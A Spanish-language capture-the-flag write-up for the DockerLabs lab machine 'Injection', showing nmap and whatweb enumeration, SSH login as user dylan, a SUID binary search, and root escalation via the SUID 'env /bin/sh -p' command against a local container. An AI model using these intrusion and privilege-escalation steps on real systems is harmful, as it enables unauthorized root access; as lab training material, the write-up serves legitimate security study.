# Injection
https://dockerlabs.es

*23/5/2024*


## ENUMERACION

```
└─$ nmap -p- --open --min-rate 5000 -sCV 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 14:45 EDT
Nmap scan report for 172.17.0.2
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:1f:e1:92:70:3f:21:a2:0a:c6:a6:0e:b8:a2:aa:d5 (ECDSA)
|_  256 8f:3a:cd:fc:03:26:ad:49:4a:6c:a1:89:39:f9:7c:22 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Iniciar Sesi\xC3\xB3n
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
└─$ whatweb 172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.52], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[172.17.0.2], PasswordField[password], Title[Iniciar Sesión]
```
![loginapache](https://github.com/M1queaa/DOCKERLABS/assets/108646257/73243f11-c058-454f-8066-694123cb361b)




## ANALISIS DE VULNERABILIDADES

![image](https://github.com/M1queaa/DOCKERLABS/assets/108646257/ee78adb9-fe76-44ac-8048-14d396fb5291)

![image](https://github.com/M1queaa/DOCKERLABS/assets/108646257/3b2ca696-f8d8-44b4-a50a-98e6fe57bc46)



## EXPLOTACION

```
└─$ ssh dylan@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:5ic4ZXizeEb8agR4jNX59cBONCe5b5iEcU9lf2zt0Q0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
dylan@172.17.0.2's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.6.9-amd64 x86_64)

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

dylan@6a8789052cc6:~$ whoami
dylan

```



## POST-EXPLOTACION

```
dylan@6a8789052cc6:~$ sudo -l
-bash: sudo: command not found
dylan@6a8789052cc6:~$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                         
/usr/lib/openssh/ssh-keysign                                                                                        
/usr/bin/chsh                                                                                                       
/usr/bin/su                                                                                                         
/usr/bin/mount                                                                                                      
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/env
/usr/bin/newgrp
```


Vemos que podemos aprovechar el binario SUID de env para escalar privilegios

![image](https://github.com/M1queaa/DOCKERLABS/assets/108646257/67293647-33d5-43a9-883e-f297fff35a68)

```
dylan@6a8789052cc6:/usr/bin$ ./env /bin/sh -p
# whoami
root
```
